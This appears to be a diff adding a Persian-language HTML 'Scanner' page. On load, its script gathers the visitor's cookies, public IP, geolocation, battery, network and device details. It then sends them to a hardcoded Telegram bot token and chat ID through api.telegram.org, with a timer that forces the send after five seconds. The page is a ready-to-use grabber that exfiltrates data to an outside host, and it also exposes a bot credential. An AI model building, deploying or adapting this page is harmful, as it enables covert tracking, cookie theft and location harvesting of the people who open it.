@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #0a0a0a;
+            color: #fff;
+            direction: rtl;
+        }
+        .status {
+            font-size: 24px;
+            margin-top: 30px;
+        }
+        .loading {
+            color: #ffaa00;
+        }
+        .success {
+            color: #00ff88;
+        }
+        .error {
+            color: #ff4444;
+        }
+        #log {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 500px;
+            margin: 20px auto;
+            text-align: right;
+            font-size: 13px;
+            max-height: 300px;
+            overflow: auto;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <h1>📱 در حال جمع‌آوری اطلاعات...</h1>
+    <div id="log"></div>
+    <div class="status loading" id="status">⏳ لطفاً صبر کنید...</div>
+
+    <script>
+    // ===== تنظیمات شما =====
+    const botToken = '8874650639:AAEsfjBTpVVUuGUQq1FpliGdqh5GAWhD6BQ';
+    const chatId = '7881167408';
+    // ========================
+
+    const logElement = document.getElementById('log');
+    const statusElement = document.getElementById('status');
+
+    function addLog(msg, isError = false) {
+        const color = isError ? '#ff4444' : '#00ff88';
+        logElement.innerHTML += `<div style="color: ${color}; margin: 5px 0;">▶ ${msg}</div>`;
+        logElement.scrollTop = logElement.scrollHeight;
+    }
+
+    addLog('🔄 شروع جمع‌آوری اطلاعات...');
+
+    // جمع‌آوری اطلاعات
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        time: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: document.cookie || 'بدون کوکی',
+        memory: navigator.deviceMemory || 'نامشخص',
+        cores: navigator.hardwareConcurrency || 'نامشخص',
+        touchSupport: 'ontouchstart' in window ? 'بله' : 'خیر',
+        ip: null,
+        location: null,
+        battery: null,
+        connection: null
+    };
+
+    addLog('✅ اطلاعات دستگاه جمع شد');
+
+    // گرفتن IP
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(r => {
+            data.ip = r.ip;
+            addLog('✅ IP: ' + r.ip);
+            checkAndSend();
+        })
+        .catch(() => {
+            addLog('⚠️ خطا در دریافت IP', true);
+            checkAndSend();
+        });
+
+    // گرفتن موقعیت
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                data.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+                addLog(`✅ موقعیت: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+            },
+            () => {
+                data.location = 'دسترسی به موقعیت رد شد';
+                addLog('⚠️ دسترسی به موقعیت رد شد', true);
+            }
+        );
+    }
+
+    // گرفتن باتری
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            data.battery = {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging ? 'در حال شارژ' : 'در حال دشارژ'
+            };
+            addLog('✅ باتری: ' + data.battery.level);
+            checkAndSend();
+        });
+    }
+
+    // گرفتن اطلاعات شبکه
+    if (navigator.connection) {
+        data.connection = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + ' Mbps',
+            rtt: navigator.connection.rtt + ' ms'
+        };
+        addLog('✅ شبکه: ' + data.connection.type);
+    }
+
+    let sent = false;
+
+    function checkAndSend() {
+        if (sent) return;
+        // منتظر بمون تا همه اطلاعات بیاد
+        setTimeout(() => {
+            sendToTelegram();
+            sent = true;
+        }, 2000);
+    }
+
+    // ارسال به تلگرام شما
+    function sendToTelegram() {
+        addLog('📤 ارسال به تلگرام...');
+        
+        const text = encodeURIComponent(JSON.stringify(data, null, 2));
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+
+        fetch(url)
+            .then(res => res.json())
+            .then(result => {
+                if (result.ok) {
+                    addLog('✅ با موفقیت به تلگرام شما ارسال شد!');
+                    statusElement.className = 'status success';
+                    statusElement.innerHTML = '✅ اطلاعات به تلگرام شما ارسال شد!';
+                } else {
+                    addLog('❌ خطا: ' + result.description, true);
+                    statusElement.className = 'status error';
+                    statusElement.innerHTML = '❌ خطا در ارسال: ' + result.description;
+                }
+            })
+            .catch(err => {
+                addLog('❌ خطای شبکه: ' + err.message, true);
+                statusElement.className = 'status error';
+                statusElement.innerHTML = '❌ خطای شبکه';
+            });
+    }
+
+    // بک‌آپ: بعد ۵ ثانیه حتماً بفرست
+    setTimeout(() => {
+        if (!sent) {
+            sendToTelegram();
+            sent = true;
+        }
+    }, 5000);
+    </script>
+</body>
+</html>
